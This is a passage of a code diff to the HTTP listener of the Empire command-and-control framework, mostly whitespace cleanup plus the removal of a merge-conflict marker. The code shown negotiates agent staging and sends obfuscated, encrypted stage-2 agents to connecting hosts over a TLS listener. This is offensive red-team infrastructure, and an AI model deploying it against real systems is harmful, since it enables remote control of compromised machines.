-                message = "[!] Error retrieving cookie value from {}: {}".format(clientIP, e)
-                signal = json.dumps({
-                    'print': False,
-                    'message': message
-                })
-                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
             # the routing packet should be at the front of the binary request.data
             #   NOTE: this can also go into a cookie/etc.
             dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP)
@@ -1271,7 +1133,7 @@ def send_message(packets=None):
                                 clientIP = '[' + str(clientIP) + ']'
                             sessionID = results.split(b' ')[1].strip().decode('UTF-8')
                             sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
-                            
+
                             listenerName = self.options['Name']['Value']
                             message = "[*] Sending agent (stage 2) to {} at {}".format(sessionID, clientIP)
                             signal = json.dumps({
@@ -1279,7 +1141,7 @@ def send_message(packets=None):
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                            
+
                             hopListenerName = request.headers.get('Hop-Name')
                             try:
                                 hopListener = helpers.get_listener_options(hopListenerName)
@@ -1287,16 +1149,16 @@ def send_message(packets=None):
                                 tempListenerOptions['Host']['Value'] = hopListener['Host']['Value']
                             except TypeError:
                                 tempListenerOptions = listenerOptions
-                            
+
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                             agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions,
                                                             obfuscate=self.mainMenu.obfuscate,
                                                             obfuscationCommand=self.mainMenu.obfuscateCommand)
                             encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                             # TODO: wrap ^ in a routing packet?
-                            
+
                             return make_response(encryptedAgent, 200)
-                        
+
                         elif results[:10].lower().startswith(b'error') or results[:10].lower().startswith(b'exception'):
                             listenerName = self.options['Name']['Value']
                             message = "[!] Error returned for results by {} : {}".format(clientIP, results)
@@ -1321,14 +1183,14 @@ def send_message(packets=None):
                         return make_response(self.default_response(), 404)
             else:
                 return make_response(self.default_response(), 404)
-        
+
         try:
             certPath = listenerOptions['CertPath']['Value']
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
                 certPath = os.path.abspath(certPath)
                 pyversion = sys.version_info
-                
+
                 # support any version of tls
                 pyversion = sys.version_info
                 if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
@@ -1337,7 +1199,7 @@ def send_message(packets=None):
                     proto = ssl.PROTOCOL_TLS
                 else:
                     proto = ssl.PROTOCOL_SSLv23
-                
+
                 context = ssl.SSLContext(proto)
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key" % (certPath))
                 cipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
@@ -1347,7 +1209,7 @@ def send_message(packets=None):
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
-        
+
         except Exception as e:
             print(helpers.color("[!] Listener startup on port %s failed: %s " % (port, e)))
             listenerName = self.options['Name']['Value']
@@ -1357,7 +1219,7 @@ def send_message(packets=None):
                 'message': message
             })
             dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-    
+
     def start(self, name=''):
         """
         Start a threaded instance of self.start_server() and store it in the
@@ -1377,26 +1239,26 @@ def send_message(packets=None):
             time.sleep(1)
             # returns True if the listener successfully started, false otherwise
             return self.threads[name].is_alive()
-    
+
     def shutdown(self, name=''):
         """
         Terminates the server thread stored in the self.threads dictionary,
         keyed by the listener name.
         """
-        
+
         if name and name != '':
             print(helpers.color("[!] Killing listener '%s'" % (name)))
             self.threads[name].kill()
         else:
             print(helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value'])))
             self.threads[self.options['Name']['Value']].kill()
-    
+
     def generate_cookie(self):
         """
         Generate Cookie
         """
-        
+
         chars = string.ascii_letters
         cookie = helpers.random_string(random.randint(6, 16), charset=chars)
-        
+
         return cookie
